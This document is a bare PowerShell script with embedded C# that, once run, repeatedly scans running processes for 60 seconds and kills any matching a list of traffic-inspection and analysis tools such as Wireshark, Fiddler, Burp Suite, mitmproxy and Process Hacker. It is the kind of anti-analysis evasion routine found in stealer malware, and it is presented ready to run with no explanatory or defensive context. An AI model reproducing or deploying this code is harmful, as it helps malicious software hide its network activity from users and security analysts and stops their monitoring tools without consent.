$code = @"
using System;
using System.Runtime.InteropServices;
using System.Threading;

public static class AntiProcess
{
    private static Thread blockThread = new Thread(BlockProcess);
    public static bool IsEnabled { get; set; }

    public static void StartBlocking()
    {
        IsEnabled = true;
        blockThread.Start();
    }

    public static void StopBlocking()
    {
        IsEnabled = false;
        try
        {
            blockThread.Abort();
            blockThread = new Thread(BlockProcess);
        }
        catch (ThreadAbortException)
        {
            // Ignore exception
        }
    }

    private static void BlockProcess()
    {
        while (IsEnabled)
        {
            IntPtr snapshot = CreateSnapshot();
            PROCESSENTRY32 processEntry = new PROCESSENTRY32
            {
                dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32))
            };

            if (Process32First(snapshot, ref processEntry))
            {
                do
                {
                    if (IsTargetProcess(processEntry.szExeFile))
                    {
                        KillProcess(processEntry.th32ProcessID);
                    }
                } while (Process32Next(snapshot, ref processEntry));
            }

            CloseHandle(snapshot);
            Thread.Sleep(150);
        }
    }

    private static IntPtr CreateSnapshot()
    {
        return CreateToolhelp32Snapshot(0x00000002, 0U);
    }

    private static bool IsTargetProcess(string processName)
    {
        return processName.EndsWith("watcher.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("ProcessHacker.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("mitmdump.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("mitmproxy.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("mitmweb.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("Insomnia.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("HTTP Toolkit.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("Charles.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("Postman.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("BurpSuiteCommunity.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("Fiddler Everywhere.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("Fiddler.WebUi.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("HTTPDebuggerUI.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("HTTPDebuggerSvc.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("HTTPDebuggerPro.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("Progress Telerik Fiddler Web Debugger.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("HTTP Debugger Pro.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("Fiddler.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("FolderChangesView.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("Wireshark.exe", StringComparison.OrdinalIgnoreCase);
    }

    private static void KillProcess(uint processId)
    {
        IntPtr processHandle = OpenProcess(0x0001, false, processId);
        TerminateProcess(processHandle, 0);
        CloseHandle(processHandle);
    }

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

    [DllImport("kernel32.dll")]
    private static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("kernel32.dll")]
    private static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("kernel32.dll")]
    private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr handle);

    [DllImport("kernel32.dll")]
    private static extern bool TerminateProcess(IntPtr hProcess, int exitCode);

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESSENTRY32
    {
        public uint dwSize;
        public uint cntUsage;
        public uint th32ProcessID;
        public IntPtr th32DefaultHeapID;
        public uint th32ModuleID;
        public uint cntThreads;
        public uint th32ParentProcessID;
        public int pcPriClassBase;
        public uint dwFlags;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szExeFile;
    }
}
"@
Add-Type -TypeDefinition $code -Language CSharp;[AntiProcess]::StartBlocking();Start-Sleep -Seconds 60;[AntiProcess]::StopBlocking()